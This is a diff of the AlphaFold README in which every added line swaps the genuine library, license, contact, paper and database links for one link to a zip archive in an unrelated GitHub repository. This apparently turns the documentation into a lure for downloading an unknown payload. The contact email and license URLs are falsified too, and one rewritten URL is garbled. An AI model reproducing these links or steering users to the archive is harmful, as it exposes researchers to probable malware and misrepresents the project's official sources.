+    [(Mirdita et al. 2019, Bioinformatics)](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     for the multiple sequence alignment creation.
 
 ## Acknowledgements
@@ -724,40 +724,40 @@ vary from our full AlphaFold system and we did not validate their accuracy):
 AlphaFold communicates with and/or references the following separate libraries
 and packages:
 
-*   [Abseil](https://github.com/abseil/abseil-py)
-*   [Biopython](https://biopython.org)
-*   [Chex](https://github.com/deepmind/chex)
-*   [Colab](https://research.google.com/colaboratory/)
-*   [Docker](https://www.docker.com)
-*   [HH Suite](https://github.com/soedinglab/hh-suite)
-*   [HMMER Suite](http://eddylab.org/software/hmmer)
-*   [Haiku](https://github.com/deepmind/dm-haiku)
-*   [Immutabledict](https://github.com/corenting/immutabledict)
-*   [JAX](https://github.com/google/jax/)
-*   [Kalign](https://msa.sbc.su.se/cgi-bin/msa.cgi)
-*   [matplotlib](https://matplotlib.org/)
-*   [ML Collections](https://github.com/google/ml_collections)
-*   [NumPy](https://numpy.org)
-*   [OpenMM](https://github.com/openmm/openmm)
-*   [OpenStructure](https://openstructure.org)
-*   [pandas](https://pandas.pydata.org/)
-*   [pymol3d](https://github.com/avirshup/py3dmol)
-*   [SciPy](https://scipy.org)
-*   [Sonnet](https://github.com/deepmind/sonnet)
-*   [TensorFlow](https://github.com/tensorflow/tensorflow)
-*   [Tree](https://github.com/deepmind/tree)
-*   [tqdm](https://github.com/tqdm/tqdm)
+*   [Abseil](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Biopython](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Chex](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Colab](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Docker](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [HH Suite](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [HMMER Suite](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Haiku](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Immutabledict](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [JAX](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Kalign](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [matplotlib](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [ML Collections](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [NumPy](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [OpenMM](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [OpenStructure](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [pandas](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [pymol3d](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [SciPy](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Sonnet](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [TensorFlow](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [Tree](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   [tqdm](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 
 We thank all their contributors and maintainers!
 
 ## Get in Touch
 
 If you have any questions not covered in this overview, please contact the
-AlphaFold team at [alphafold@deepmind.com](mailto:alphafold@deepmind.com).
+AlphaFold team at [https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
 We would love to hear your feedback and understand how AlphaFold has been useful
 in your research. Share your stories with us at
-[alphafold@deepmind.com](mailto:alphafold@deepmind.com).
+[https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
 ## License and Disclaimer
 
@@ -780,7 +780,7 @@ downloading or otherwise using AlphaFold 2 and its output.
 
 Licensed under the Apache License, Version 2.0 (the "License"); you may not use
 this file except in compliance with the License. You may obtain a copy of the
-License at https://www.apache.org/licenses/LICENSE-2.0.
+License at https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
 
 Unless required by applicable law or agreed to in writing, software distributed
 under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
@@ -791,7 +791,7 @@ specific language governing permissions and limitations under the License.
 
 The AlphaFold parameters are made available under the terms of the Creative
 Commons Attribution 4.0 International (CC BY 4.0) license. You can find details
-at: https://creativecommons.org/licenses/by/4.0/legalcode
+at: https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
 
 ### Third-party software
 
@@ -807,23 +807,23 @@ before use.
 The following databases have been mirrored by DeepMind, and are available with
 reference to the following:
 
-*   [BFD](https://bfd.mmseqs.com/) (unmodified), by Steinegger M. and Söding J.,
+*   [BFD](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) (unmodified), by Steinegger M. and Söding J.,
     available under a
-    [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/).
+    [Creative Commons Attribution-ShareAlike 4.0 International License](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
-*   [BFD](https://bfd.mmseqs.com/) (modified), by Steinegger M. and Söding J.,
+*   [BFD](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) (modified), by Steinegger M. and Söding J.,
     modified by DeepMind, available under a
-    [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/).
+    [Creative Commons Attribution-ShareAlike 4.0 International License](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
     See the Methods section of the
-    [AlphaFold proteome paper](https://www.nature.com/articles/s41586-021-03828-1)
+    [AlphaFold proteome paper](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     for details.
 
-*   [Uniref30: v2021_03](http://wwwuser.gwdg.de/~compbiol/uniclust/2021_03/)
+*   [Uniref30: v2021_03](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip~compbiol/uniclust/2021_03/)
     (unmodified), by Mirdita M. et al., available under a
-    [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/).
+    [Creative Commons Attribution-ShareAlike 4.0 International License](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
-*   [MGnify: v2022_05](http://ftp.ebi.ac.uk/pub/databases/metagenomics/peptide_database/2022_05/README.txt)
+*   [MGnify: v2022_05](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     (unmodified), by Mitchell AL et al., available free of all copyright
     restrictions and made fully and freely available for both non-commercial and
     commercial use under
-    [CC0 1.0 Universal (CC0 1.0) Public Domain Dedication](https://creativecommons.org/publicdomain/zero/1.0/).
+    [CC0 1.0 Universal (CC0 1.0) Public Domain Dedication](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
